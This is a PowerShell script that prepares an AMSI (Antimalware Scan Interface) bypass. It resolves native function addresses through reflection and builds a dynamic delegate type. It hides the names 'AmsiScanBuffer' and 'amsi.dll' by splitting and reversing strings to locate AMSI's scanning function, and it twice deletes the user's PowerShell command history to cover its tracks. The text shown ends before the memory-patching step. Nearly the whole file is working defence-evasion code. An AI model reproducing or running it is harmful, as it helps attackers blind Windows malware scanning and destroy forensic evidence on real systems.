function func {
    Param ($moduleName, $bananationName)
    $myass = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $myass.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($myass.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $bananationName))
}
rm $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

function My {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $banana, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $banana).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$banana). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
rm $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

$a="A"
$b="ms"
$c="iS"
$d="canB"
$e="uffer"
$com = ($a,$b,$c,$d,$e -Join '')
$rev = "lld.isma"
[IntPtr]$bananaAddr = func (([regex]::Matches($rev,'.','RightToLeft') | ForEach {$_.value}) -join '') $com
$oldProtectionBuffer = 0
